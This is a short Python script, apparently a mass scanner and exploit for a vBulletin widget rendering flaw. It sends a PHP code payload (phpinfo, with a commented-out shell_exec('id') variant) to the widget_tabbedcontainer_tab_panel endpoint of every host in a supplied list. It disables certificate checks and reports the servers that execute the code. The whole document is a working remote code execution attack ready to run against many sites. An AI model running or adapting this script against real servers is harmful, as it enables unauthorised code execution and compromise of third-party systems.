#!/usr/bin/env python

import sys
import requests
import urllib3

from requests.exceptions import ReadTimeout, ConnectionError, InvalidURL, TooManyRedirects

PAYLOAD1="/ajax/render/widget_tabbedcontainer_tab_panel"
#PAYLOAD2="subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo%20%shell_exec(\"id\");exit;"
PAYLOAD2="subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();"


def check_url(url, count, total):
    print(f"Trying {count}/{total}" + (" " * 6), end='\r', file=sys.stderr)
    try:
        r = requests.post(url, timeout=1, verify=False, data=PAYLOAD2)
        if r.status_code == 200:
            content_str = str(r.content)
            #if "uid=" in content_str.lower():
            if "php version" in content_str.lower():
                print(f"\nVulnerable: {url}: {content_str[:80]}")
    except KeyboardInterrupt:
        print("Interrupted, exiting")
        sys.exit(0)
    except:
        pass



def main(file_input):
    with open(file_input, "r") as f:
        lines = f.readlines()
        lines = [o.strip().strip("/") for o in lines]
        lines = sorted(set(lines))

    total = len(lines)

    count = 0
    for line in lines:
        count += 1
        if not (line.startswith("http://") or line.startswith("https://")):
            line = "http://" + line
            
        check_url(line + PAYLOAD1, count, total)
#        check_url(line + PAYLOAD2, count, total)


if __name__ == '__main__':
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    main(sys.argv[1])
